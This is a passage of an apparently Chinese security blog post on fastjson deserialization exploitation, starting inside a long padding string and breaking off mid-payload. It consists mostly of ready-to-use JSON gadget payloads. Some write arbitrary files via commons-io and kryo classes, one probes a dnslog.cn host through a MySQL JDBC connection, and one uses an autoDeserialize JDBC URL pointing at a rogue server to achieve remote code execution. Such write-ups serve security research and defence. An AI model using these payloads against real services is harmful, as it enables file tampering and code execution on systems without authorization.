aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span><span class="number">1024</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/2222&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;decoder&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.alibaba.fastjson.util.UTF8Decoder&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;trigger&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;trigger2&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;trigger3&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260115131431-8vzncn4.png" alt="image"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260115131438-35bbyqq.png" alt="image"></p>
+<p>‍</p>
+<h4 id="kryo-Output"><a href="#kryo-Output" class="headerlink" title="kryo - Output"></a>kryo - Output</h4><p>利用<code>kryo</code>依赖下的类<code>com.esotericsoftware.kryo.io.Output</code>​</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> &#x27;java.io.FileOutputStream&#x27;<span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> &#x27;/tmp/attack&#x27;<span class="punctuation">,</span></span><br><span class="line">         <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span>     <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;buffer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cHduZWQ=&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;outputStream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.stream&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;position&quot;</span><span class="punctuation">:</span> <span class="number">5</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;close&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.writer&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;protocolVersion&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是<code>FileOutputStream</code>可能会抛出<code>default constructor not found. class java.io.FileOutputStream</code>异常，且需要用到<code>kryo</code>依赖，利用有限</p>
+<p>‍</p>
+<h3 id="MySQL-JDBC-利用"><a href="#MySQL-JDBC-利用" class="headerlink" title="MySQL JDBC 利用"></a>MySQL JDBC 利用</h3><h4 id="JDBC4Connection"><a href="#JDBC4Connection" class="headerlink" title="JDBC4Connection"></a>JDBC4Connection</h4><p>​<code>v6.x</code>和<code>v8.x</code>删除了这个类，只能利用低版本的<code>mysql jdbc</code>驱动</p>
+<h5 id="DNSLOG-探测-RCE"><a href="#DNSLOG-探测-RCE" class="headerlink" title="DNSLOG 探测 &amp; RCE"></a>DNSLOG 探测 &amp; RCE</h5><p>在<code>mysql jdbc 5.1.11</code>​</p>
+<p>利用构造函数最终调用到<code>com.mysql.jdbc.SocketFactory#connect</code>​</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hostToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;coclru.dnslog.cn&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;portToConnectTo&quot;</span><span class="punctuation">:</span> <span class="number">3306</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;root&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;root&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;NUM_HOSTS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;databaseToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lingx5&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>同理可以利用<code>mysql jdbc</code>反序列化<code>RCE</code>，但是感觉这个版本太低用的不是很多，不做赘述。</p>
+<p>‍</p>
+<h4 id="LoadBalancedMySQLConnection"><a href="#LoadBalancedMySQLConnection" class="headerlink" title="LoadBalancedMySQLConnection"></a>LoadBalancedMySQLConnection</h4><p>适用于<code>mysql jdbc 6.2/6.3</code>​</p>
+<p>调用有参构造函数</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260115152800-e3wh53j.png" alt="image"></p>
+<p>参数<code>proxy</code>在实例化时调用<code>pickNewConnection</code>进行<code>jdbc</code>连接</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260115152843-0kmc9cx.png" alt="image"></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;proxy&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;connectionString&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;jdbc:mysql://0.0.0.0:51549/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CUSTOM&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h4 id="ReplicationMySQLConnection"><a href="#ReplicationMySQLConnection" class="headerlink" title="ReplicationMySQLConnection"></a>ReplicationMySQLConnection</h4><p>只适用于<code>mysql jdbc 8.0.19</code>​</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;proxy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;connectionUrl&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                     <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span><span class="punctuation">,</span></span><br><span class="line">                     <span class="attr">&quot;masters&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span 